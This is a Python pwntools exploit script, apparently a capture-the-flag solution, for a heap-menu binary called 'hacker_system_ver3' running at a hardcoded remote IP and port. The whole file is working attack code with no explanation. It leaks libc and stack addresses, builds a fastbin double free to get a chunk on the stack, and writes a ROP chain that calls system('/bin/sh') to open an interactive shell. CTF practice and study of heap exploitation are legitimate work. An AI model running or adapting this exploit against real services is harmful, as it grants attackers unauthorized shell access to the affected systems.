#!/usr/bin/env python

from pwn import *

context.log_level = "debug"

elf = "./hacker_system_ver3"
ENV = {"LD_PRELOAD":"./libc64.so"}

unsorted_bin_off = 0x3c4b78
system_off = 0x45390
bin_sh_off = 0x18cd57
malloc_hook_off = 0x3c4aed
libc_argv_off = 0x3c92f8
pop_rdi_ret = 0x401053

#p = process(elf)
p = remote("111.230.149.72", 10014)

def add(name, age, length, intro):
    p.recvuntil("> ")
    p.sendline("1")
    p.recvuntil("input the hacker's name:")
    p.sendline(name)
    p.recvuntil("input the hacker's age:")
    p.sendline(str(age))
    p.recvuntil("input the introduce's length:")
    p.sendline(str(length))
    p.recvuntil("input the intro:")
    p.send(intro)

def printh(name):
    p.recvuntil("> ")
    p.sendline("2")
    p.recvuntil("input hacker's name:")
    p.send(name)
    
def delete(name):
    p.recvuntil("> ")
    p.sendline("3")
    p.recvuntil("input hacker's name:")
    p.sendline(name)


add("A1", 1, 0x80, "\n")
add("A1", 1, 0x10, "\n")
add("A2", 1, 0x10, "\n")
add("A2", 1, 0x10, "\n")
add("B", 1, 0x60, "\n")

delete("A1")

printh("A1\n")

p.recvuntil("intro:")
libc_base = u64(p.recv(6).ljust(8, "\x00"))-unsorted_bin_off
log.info("libc_base: "+hex(libc_base))

system_addr = libc_base+system_off
bin_sh_addr = libc_base+bin_sh_off
malloc_hook = libc_base+malloc_hook_off
libc_argv_addr = libc_base+libc_argv_off

delete("A2")

payload = p64(0)+p64(0x4141)
payload += p64(0)*4
payload += p64(libc_argv_addr)
add("C", 1, 0x38, payload)

printh("AA\n")

p.recvuntil("intro:")
stack_addr = u64(p.recv(6).ljust(8, "\x00"))
log.info("stack_addr: "+hex(stack_addr))

add_rbp = stack_addr-0xf8

add("D", 1, 0x60, "\n")

delete("D") # fastbin -> "D"
delete("B") # fastbin -> "B" -> "D"
delete("A1") # fastbin -> "A" == "D" -> "B" -> "D"

add("E", 1, 0x60, p64(stack_addr-0x13b)+"\n")
add("F", 1, 0x60, "\n")
add("G", 1, 0x60, "\n")

payload = p8(0)*0xb
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)
payload += "\n"
add("H", 1, 0x60, payload)

p.interactive()
